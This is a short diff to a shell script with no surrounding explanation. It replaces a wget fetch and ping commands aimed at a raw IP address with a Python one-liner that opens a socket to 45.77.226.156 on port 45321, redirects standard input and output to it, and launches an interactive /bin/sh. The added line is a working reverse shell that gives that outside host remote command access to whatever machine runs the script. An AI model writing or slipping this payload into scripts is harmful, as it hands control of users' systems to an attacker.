@@ -1,5 +1,3 @@
 #!/usr/bin/env sh
 
-wget https://45.77.226.156:45321/testingme.txt
-/bin/ping -c 6 45.77.226.156
-ping -c 4 45.77.226.156
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("45.77.226.156",45321));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
